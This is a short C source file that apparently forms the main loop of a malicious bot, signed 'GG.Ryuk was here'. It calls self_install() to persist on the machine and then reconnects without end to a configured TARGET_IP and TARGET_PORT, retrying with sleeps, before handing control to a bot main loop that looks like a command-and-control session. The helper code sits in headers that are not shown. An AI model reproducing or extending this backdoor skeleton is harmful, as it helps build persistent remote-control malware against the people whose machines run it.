/*
 * GG.Ryuk was here.
 *
 */

#include <stdio.h>

#include "common.h"
#include "config.h"
#include "coreinstall.h"
#include "log.h"
#include "sock.h"
#include "corebot.h"
#include "util.h"

int
bot_single_session()
{
	struct bot bot;
	int i;

#if DEBUG > 1
	//close unusable fds
	//close(0);
	//close(1);
#endif

	bot_init(&bot);

	if (bot_set_ip(&bot, TARGET_IP) == false)
		goto err;

	if (bot_set_port(&bot, TARGET_PORT) == false)
		goto err;
	
	i = 0;
	while (bot_init_connection(&bot) == false) {
		i++;
		if (i > ATTEMPTS_MAX) {
			//evil bot waiting...
			i = 0;
			my_sleep(60);
		}

		my_usleep(USEC_IDLE_BETWEEN_CONNECT);
	}

	if (bot_main_loop(&bot) == false) {
		DEBUG(LOG_DEFAULT, "main loop ended with some errors\n");
		goto err;
	}
	
	bot_close_connection(&bot);

	return 0;

err:
	return 1;
}

int
//main()
ENTRY_POINT()
{
	DEBUG(LOG_DEFAULT, "new execution....\n");
	if (NEED_INSTALLATION)
		self_install();

	Socketlib_init();

	while (1) {
		bot_single_session();
	}

	Socketlib_uninit();

	return 0;
}

